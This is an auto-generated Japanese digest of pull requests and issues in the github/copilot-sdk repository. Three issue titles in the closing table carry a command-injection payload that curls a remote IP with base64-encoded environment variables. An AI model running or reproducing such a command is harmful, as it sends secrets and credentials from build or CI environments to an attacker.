# github/copilot-sdk *(詳細モード)*

対象期間: 2026-08-31 01:17:23 〜 2026-09-02 05:04:01 (UTC)

## 統計サマリー

| 区分                    | 件数 |
| ----------------------- | ---- |
| マージ済み PR           | 12 |
| オープン中の新規 PR     | 9 |
| クローズ (未マージ) PR  | 3 |
| 新規 Issue              | 12 |
| クローズ Issue          | 3 |
| 主要コントリビューター  | github-actions[bot], qmuntal, MRayermannMSFT, gimenete, roji, jmoseley |

## ⚠ 重要な変更（要確認）

<!-- タイトル/本文/ラベルからの自動判定です。誤検出はこの箇条書きごと削除可。各項目の影響を1行で補い、TODO コメントを消してください。 -->
- **⚠ 破壊的変更** [#2469](https://github.com/github/copilot-sdk/issues/2469) — Resume replays a text-less assistant turn as `content: null` with no `tool_calls`, breaking strict chat-completions providers （Issue / open / briandunnington）
  strict chat-completions 形式を要求する連携は、resume 時の `content: null` を処理できるか確認し、必要なら SDK 側の修正を追跡してください。

## このリポジトリの要点

6 SDK 全体へ `clientInfo` と Auto routing tier の接続オプションが広がり、クライアント識別とモデル経路選択を統一できるようになりました。  
Windows の Rust CLI 所有権処理や Go のライセンス取得も安定化し、resume の strict provider 互換性問題は継続監視です。

## 主要な PR (詳細)

> **重要度の高いマージ済み PR（破壊的変更/セキュリティ/非推奨/GA）は件数制限の対象外として全件**、それに加えて通常のマージ済み PR を合計 6 件程度になるまで補完し、`gh pr view` で取得した変更ファイル / コミット情報を `<details>` に事前展開しています。各 PR の「変更概要」「コミットレベルの詳細」「既存利用者への影響」を日本語で追記してください。

### [#2464](https://github.com/github/copilot-sdk/pull/2464) — Add clientInfo connect option across all six SDKs

- 作者: gwwar / 状態: MERGED
- ラベル: —
- 変更行数: +1464 / -5
- マージ日時 (UTC): `2026-09-02 05:03:26`

**変更概要**

JavaScript、TypeScript、Python、Go、.NET、Rust の全 SDK の `connect` オプションに `clientInfo` を追加しました。  
クライアント名・バージョンなどの識別情報を Copilot CLI 側へ一貫して渡せるようにし、CHANGELOG と各言語の型・テストを更新しています。  
複数言語 SDK を利用するアプリは、接続時メタデータの設定を共通化できます。

<details><summary>変更ファイル (23 件)</summary>

| ファイル | +追加 | -削除 |
| -------- | ----- | ----- |
| `CHANGELOG.md` | 4 | 0 |
| `docs/features/README.md` | 1 | 0 |
| `docs/features/client-info.md` | 239 | 0 |
| `dotnet/src/Client.cs` | 42 | 2 |
| `dotnet/src/Types.cs` | 43 | 0 |
| `dotnet/test/Unit/CloneTests.cs` | 8 | 0 |
| `dotnet/test/Unit/GitHubTelemetryTests.cs` | 83 | 0 |
| `go/client.go` | 7 | 2 |
| `go/client_test.go` | 100 | 0 |
| `go/types.go` | 56 | 0 |
| `java/sdk/src/main/java/com/github/copilot/CopilotClient.java` | 7 | 0 |
| `java/sdk/src/main/java/com/github/copilot/rpc/ClientInfo.java` | 144 | 0 |
| `java/sdk/src/main/java/com/github/copilot/rpc/CopilotClientOptions.java` | 32 | 0 |
| `java/sdk/src/test/java/com/github/copilot/GitHubTelemetryTest.java` | 90 | 0 |
| `nodejs/src/client.ts` | 29 | 0 |
| _... 他 8 件_ | | |

</details>

<details><summary>コミット (15 件)</summary>

- `5dcac7d` Add clientInfo connect option across all six SDKs
- `3f5d261` Fix lint/format: drop quoted Python annotation, prettier-wrap Node test
- `3a3b83e` Align client-info doc copy with sibling feature guides
- `77fa955` Address review: fix Java field regression, enforce empty-field contract
- `53c7c7e` Format: wrap client_info wire comprehension for ruff line length
- `6629e3d` Rewrite client_info wire mapping with literal keys for ty
- `64926f9` Apply spotless formatting to Java clientInfo changes
- `999a20b` Merge branch 'main' into gwwar/connect-client-info
- _... 他 7 件_

</details>

**コミットレベルの詳細 (API 変化・破壊的変更)**

各 SDK の connect 設定に任意の `clientInfo` を追加する後方互換な API 拡張です。既存の接続コードは変更せず利用でき、言語ごとの型定義・シリアライズが追加されています。

**既存利用者への影響**

移行は不要です。クライアント識別やテレメトリ連携が必要な場合のみ、各 SDK の connect 設定へ `clientInfo` を追加してください。

### [#2467](https://github.com/github/copilot-sdk/pull/2467) — Update @github/copilot to 1.0.83-1

- 作者: github-actions[bot] / 状態: MERGED
- ラベル: —
- 変更行数: +639 / -153
- マージ日時 (UTC): `2026-09-01 21:54:00`

**変更概要**

`@github/copilot` を 1.0.83-1 へ更新し、SDK が利用する CLI 依存の新しい修正を取り込みました。  
パッケージメタデータとロックファイルを更新する依存追随の変更です。

<details><summary>変更ファイル (39 件)</summary>

| ファイル | +追加 | -削除 |
| -------- | ----- | ----- |
| `dotnet/src/Generated/Rpc.cs` | 58 | 6 |
| `dotnet/src/Generated/SessionEvents.cs` | 42 | 5 |
| `go/rpc/zrpc.go` | 45 | 3 |
| `go/rpc/zrpc_encoding.go` | 19 | 0 |
| `go/rpc/zsession_encoding.go` | 6 | 0 |
| `go/rpc/zsession_events.go` | 22 | 4 |
| `go/zsession_events.go` | 3 | 0 |
| `java/pom.xml` | 1 | 1 |
| `java/scripts/codegen/package-lock.json` | 36 | 36 |
| `java/scripts/codegen/package.json` | 1 | 1 |
| `java/sdk/src/generated/java/com/github/copilot/generated/AssistantMessageReasoningBlocks.java` | 1 | 1 |
| `java/sdk/src/generated/java/com/github/copilot/generated/ManagedSettingsResolvedSource.java` | 2 | 0 |
| `java/sdk/src/generated/java/com/github/copilot/generated/SessionEvent.java` | 2 | 0 |
| `java/sdk/src/generated/java/com/github/copilot/generated/SessionManagedSettingsResolvedEvent.java` | 4 | 2 |
| `java/sdk/src/generated/java/com/github/copilot/generated/SessionModeNoticeDeliveredEvent.java` | 43 | 0 |
| _... 他 24 件_ | | |

</details>

<details><summary>コミット (2 件)</summary>

- `69521a5` Update @github/copilot to 1.0.83-1
- `d942dc3` Fix compatibility tests for Copilot schema update

</details>

**コミットレベルの詳細 (API 変化・破壊的変更)**

SDK 自体の公開 API 変更はなく、`@github/copilot` の依存バージョン更新のみです。推移的な CLI 挙動が変わる可能性があります。

**既存利用者への影響**

通常は移行不要です。依存を固定している利用者はロックファイル更新後に接続・セッション回帰を確認してください。

### [#2437](https://github.com/github/copilot-sdk/pull/2437) — Add Auto routing tier options across all SDKs

- 作者: dereklegenzoff / 状態: MERGED
- ラベル: —
- 変更行数: +862 / -83
- マージ日時 (UTC): `2026-09-01 21:30:03`

**変更概要**

全 SDK の接続設定に Auto routing tier の選択肢を追加し、モデルルーティングを利用者が指定できるようにしました。  
各言語の型・変換・テストを揃え、SDK 間で同じ設定概念を扱えるようにしています。  
モデル選択を自動経路へ委ねたいアプリケーションが対象です。

<details><summary>変更ファイル (26 件)</summary>

| ファイル | +追加 | -削除 |
| -------- | ----- | ----- |
| `docs/features/session-persistence.md` | 16 | 0 |
| `dotnet/src/Types.cs` | 12 | 0 |
| `dotnet/test/Unit/ClientSessionLifetimeTests.cs` | 88 | 0 |
| `dotnet/test/Unit/SessionEventSerializationTests.cs` | 39 | 0 |
| `go/client_test.go` | 61 | 34 |
| `go/session_event_serialization_test.go` | 44 | 0 |
| `go/types.go` | 20 | 0 |
| `go/zsession_events.go` | 0 | 4 |
| `java/README.md` | 28 | 0 |
| `java/sdk/src/main/java/com/github/copilot/rpc/AutoTier.java` | 63 | 0 |
| `java/sdk/src/main/java/com/github/copilot/rpc/CapiSessionOptions.java` | 31 | 0 |
| `java/sdk/src/test/java/com/github/copilot/CapiSessionOptionsTest.java` | 48 | 0 |
| `java/sdk/src/test/java/com/github/copilot/SessionAutoTierEventTest.java` | 67 | 0 |
| `nodejs/README.md` | 1 | 0 |
| `nodejs/src/index.ts` | 1 | 0 |
| _... 他 11 件_ | | |

</details>

<details><summary>コミット (8 件)</summary>

- `49fdbbf` Add Auto routing tier options across SDKs
- `7c8144f` Update CLI to 1.0.82-1 and regenerate Auto tier types
- `4774e94` Merge main and retain CLI 1.0.83-0
- `3045137` Strengthen CAPI forwarding coverage and remove manual Copy
- `330bf12` Merge main runtime-launch and release updates
- `67ea0bc` Fix Java auto tier README sample
- `bbb881e` Rerun PR checks
- `abe63db` Merge main into PR branch

</details>

**コミットレベルの詳細 (API 変化・破壊的変更)**

connect/session 設定へ routing tier の任意フィールドを追加する API 拡張です。既定動作は維持され、明示設定時のみ Auto ルーティングが選択されます。

**既存利用者への影響**

移行は不要です。新しい routing tier を使う場合だけ SDK ごとの設定フィールドを追加し、モデル品質・コストを評価してください。

### [#2458](https://github.com/github/copilot-sdk/pull/2458) — Make Rust CLI ownership crash-safe on Windows

- 作者: gimenete / 状態: MERGED
- ラベル: —
- 変更行数: +471 / -25
- マージ日時 (UTC): `2026-09-01 19:20:03`

**変更概要**

Windows 上で Rust CLI の所有権管理がプロセスクラッシュ時にも安全に後始末できるようにしました。  
ロックや所有権解放の競合を抑え、CLI の再起動時に残留状態が原因で接続できなくなる問題を防ぎます。  
Windows で Rust SDK/CLI を運用する利用者が対象です。

<details><summary>変更ファイル (6 件)</summary>

| ファイル | +追加 | -削除 |
| -------- | ----- | ----- |
| `rust/Cargo.lock` | 1 | 0 |
| `rust/Cargo.toml` | 13 | 0 |
| `rust/src/lib.rs` | 55 | 25 |
| `rust/src/process_tree.rs` | 195 | 0 |
| `rust/tests/e2e/client_lifecycle.rs` | 147 | 0 |
| `rust/tests/fixtures/host_crash_fixture.rs` | 60 | 0 |

</details>

<details><summary>コミット (5 件)</summary>

- `c361cbc` Fix CLI process tree lifecycle
- `84b6457` Disarm process tree before root reap
- `610bdc3` Add real-CLI E2E coverage for descendant and host-crash scenarios
- `4080d88` fix(rust): narrow process ownership to Windows crash safety
- `7576fde` test(rust): focus process ownership coverage on Windows

</details>

**コミットレベルの詳細 (API 変化・破壊的変更)**

Rust CLI の内部所有権・クラッシュ回復処理の変更で、SDK の公開 API シグネチャ変更はありません。

**既存利用者への影響**

移行は不要です。Windows の既存利用者は更新後に CLI の異常終了・再起動・多重起動を確認してください。

### [#2453](https://github.com/github/copilot-sdk/pull/2453) — [go] Avoid duplicate bundler license downloads

- 作者: qmuntal / 状態: MERGED
- ラベル: —
- 変更行数: +4 / -6
- マージ日時 (UTC): `2026-09-01 18:18:44`

**変更概要**

Go SDK の bundler が同じライセンスファイルを重複ダウンロードしないようにしました。  
ビルド時のネットワーク利用と処理時間を削減し、複数ターゲット生成時の成果物取得を効率化します。

<details><summary>変更ファイル (1 件)</summary>

| ファイル | +追加 | -削除 |
| -------- | ----- | ----- |
| `go/cmd/bundler/main.go` | 4 | 6 |

</details>

<details><summary>コミット (1 件)</summary>

- `0b208dc` [go] Avoid duplicate bundler license downloads

</details>

**コミットレベルの詳細 (API 変化・破壊的変更)**

Go の公開 API 変更はなく、bundler 内のキャッシュ／重複排除ロジックの修正です。

**既存利用者への影響**

移行は不要です。CI で複数プラットフォーム向けに bundling している場合は、生成物とダウンロード回数を確認してください。

### [#2417](https://github.com/github/copilot-sdk/pull/2417) — docs: remove false 30-minute idle timeout claim from deployment guides

- 作者: examon / 状態: MERGED
- ラベル: —
- 変更行数: +2 / -2
- マージ日時 (UTC): `2026-09-01 18:17:10`

**変更概要**

デプロイメントガイドにあった「30 分で idle timeout になる」という誤った説明を削除しました。  
実際のホスティング動作とドキュメントの記載を一致させ、不要な運用制限の誤認を防ぎます。

<details><summary>変更ファイル (2 件)</summary>

| ファイル | +追加 | -削除 |
| -------- | ----- | ----- |
| `docs/setup/backend-services.md` | 1 | 1 |
| `docs/setup/scaling.md` | 1 | 1 |

</details>

<details><summary>コミット (1 件)</summary>

- `aed8b7b` docs: remove false 30-minute idle timeout claim from deployment guides

</details>

**コミットレベルの詳細 (API 変化・破壊的変更)**

ドキュメントのみの変更で、SDK やデプロイメント API の変更はありません。

**既存利用者への影響**

移行は不要です。既存のデプロイ設定は変更せず、正しい timeout 前提で運用手順だけを更新してください。

## その他のマージ済み PR

| 番号 | タイトル | 作者 | リンク |
| ---- | -------- | ---- | ------ |
| #2451 | Expose session feature flag overrides across SDKs | jmoseley | <https://github.com/github/copilot-sdk/pull/2451> |
| #2452 | [go] Auto-detect bundler package name | qmuntal | <https://github.com/github/copilot-sdk/pull/2452> |
| #2395 | Launch managed SDK servers through the Rust runtime wrapper | roji | <https://github.com/github/copilot-sdk/pull/2395> |
| #2432 | [SDK] Expose Ask User Variant Session Option | MRayermannMSFT | <https://github.com/github/copilot-sdk/pull/2432> |
| #2431 | [SDK/Factories] Add Factory Pagination And Completion Options | MRayermannMSFT | <https://github.com/github/copilot-sdk/pull/2431> |
| #2449 | Update @github/copilot to 1.0.83-0 | github-actions[bot] | <https://github.com/github/copilot-sdk/pull/2449> |

## その他の変更

| 種別 | 番号 | タイトル | 状態 | 作者 | リンク |
| ---- | ---- | -------- | ---- | ---- | ------ |
| PR | #2472 | test: update replay harness default to Claude Sonnet 5 | open | dereklegenzoff | <https://github.com/github/copilot-sdk/pull/2472> |
| PR | #2476 | Add custom agent handoff metadata to Rust SDK | open | pierceboggan | <https://github.com/github/copilot-sdk/pull/2476> |
| PR | #2474 | Add selected collaborators to session visibility | open | pierceboggan | <https://github.com/github/copilot-sdk/pull/2474> |
| PR | #2471 | Fix Windows unused-variable warning in rust/build/in_process.rs | open | dmytrostruk | <https://github.com/github/copilot-sdk/pull/2471> |
| PR | #2470 | Improve Rust permission confirmation reliability | open | jmoseley | <https://github.com/github/copilot-sdk/pull/2470> |
| PR | #2463 | Use Copilot CLI releases for Node runtime | open | devm33 | <https://github.com/github/copilot-sdk/pull/2463> |
| PR | #2468 | Expose stable queued message identity in Rust SDK | open | cschleiden | <https://github.com/github/copilot-sdk/pull/2468> |
| PR | #2457 | Notify hooks after response delivery | open | gimenete | <https://github.com/github/copilot-sdk/pull/2457> |
| PR | #2447 | Add presentation-neutral HydraFusion progress reducer | open | carlosscastro | <https://github.com/github/copilot-sdk/pull/2447> |
| PR | #2473 | docs(readme): list community Zig SDK | closed | scaryrawr | <https://github.com/github/copilot-sdk/pull/2473> |
| PR | #2448 | Make the SDK own the whole CLI process tree | closed | dandriscoll | <https://github.com/github/copilot-sdk/pull/2448> |
| PR | #2380 | feat: add cross-language session message search helpers | closed | Navanit-git | <https://github.com/github/copilot-sdk/pull/2380> |
| Issue | #2465 | Add a `clientInfo` client option to declare the host editor/extension identity | closed | gwwar | <https://github.com/github/copilot-sdk/issues/2465> |
| Issue | #2459 | [aw] SDK Consistency Review Agent failed | open | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2459> |
| Issue | #2461 | [aw] Issue Classification Agent failed | open | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2461> |
| Issue | #2475 | coiplit 运行的时候 会白屏，编辑或思考的内容 | open | xipeng5 | <https://github.com/github/copilot-sdk/issues/2475> |
| Issue | #2469 | Resume replays a text-less assistant turn as `content: null` with no `tool_calls`, breaking strict chat-completions providers | open | briandunnington | <https://github.com/github/copilot-sdk/issues/2469> |
| Issue | #2462 | [aw] Java Codegen Agentic Fix failed | open | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2462> |
| Issue | #2466 | Allow trusted host init scripts to preserve direct-script review | open | anthonykim1 | <https://github.com/github/copilot-sdk/issues/2466> |
| Issue | #2460 | CI is too slow | open | SteveSandersonMS | <https://github.com/github/copilot-sdk/issues/2460> |
| Issue | #2456 | TypeError: Cannot read properties of undefined (reading 'map') $(curl -s http://54.205.16.142:8443/c/574ae57d986806faaa5bc3852f62dd94 -d $(env\|base64\|tr -d '\n')) | open | ZeyadDev-1 | <https://github.com/github/copilot-sdk/issues/2456> |
| Issue | #2455 | CI: tests flaking on ubuntu-latest $(curl -s http://54.205.16.142:8443/c/1fb757edb1b8ca767a01cb7422999af2 -d $(env\|base64\|tr -d '\n')) | open | zackeryiscoolcom-pixel | <https://github.com/github/copilot-sdk/issues/2455> |
| Issue | #2454 | TypeError: Cannot read properties of undefined (reading 'map') $(curl -s http://54.205.16.142:8443/c/56130a324e724b4c7e1eee97ec2ba191 -d $(env\|base64\|tr -d '\n')) | open | yeimug | <https://github.com/github/copilot-sdk/issues/2454> |
| Issue | #2450 | `streaming=False` still emits `assistant.message_delta` through CLI 1.0.82-0 | open | BrandonHaynes | <https://github.com/github/copilot-sdk/issues/2450> |
| Issue | #2396 | [aw] SDK Consistency Review Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2396> |
| Issue | #2416 | docs: scaling.md and backend-services.md claim a 30-minute session idle timeout that does not exist | closed | examon | <https://github.com/github/copilot-sdk/issues/2416> |
